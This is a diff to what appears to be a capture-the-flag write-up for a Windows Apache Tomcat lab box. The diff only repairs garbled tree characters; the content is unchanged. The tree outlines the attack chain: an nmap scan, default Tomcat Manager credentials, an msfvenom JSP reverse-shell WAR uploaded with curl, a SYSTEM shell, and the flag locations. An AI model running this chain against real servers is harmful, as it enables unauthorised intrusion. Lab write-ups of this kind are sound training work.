@@ -11,19 +11,19 @@
 
 ```text
 Reconnaissance
-в”њв”Ђв”Ђ nmap -p- --min-rate 5000 в†’ 8080 (Apache Tomcat/Coyote JSP engine 1.1)
-в””в”Ђв”Ђ /manager/html exposed (401 Unauthorized, Basic realm="Tomcat Manager Application")
+├── nmap -p- --min-rate 5000 → 8080 (Apache Tomcat/Coyote JSP engine 1.1)
+└── /manager/html exposed (401 Unauthorized, Basic realm="Tomcat Manager Application")
 
 Foothold (Default Credentials)
-в”њв”Ђв”Ђ Default creds tomcat:<PASSWORD> on /manager/html в†’ 200 OK
-в”њв”Ђв”Ђ msfvenom -p java/jsp_shell_reverse_tcp в†’ shell.war
-в”њв”Ђв”Ђ curl -u tomcat:<PASSWORD> --upload-file shell.war в†’ deploy at /shell
-в””в”Ђв”Ђ Trigger JSP payload в†’ reverse shell as NT AUTHORITY\SYSTEM
+├── Default creds tomcat:<PASSWORD> on /manager/html → 200 OK
+├── msfvenom -p java/jsp_shell_reverse_tcp → shell.war
+├── curl -u tomcat:<PASSWORD> --upload-file shell.war → deploy at /shell
+└── Trigger JSP payload → reverse shell as NT AUTHORITY\SYSTEM
 
 Flags
-в”њв”Ђв”Ђ C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
-в”њв”Ђв”Ђ user.txt в†’ <USER_FLAG>
-в””в”Ђв”Ђ root.txt в†’ <ROOT_FLAG>
+├── C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
+├── user.txt → <USER_FLAG>
+└── root.txt → <ROOT_FLAG>
 ```
 
 > [!NOTE]
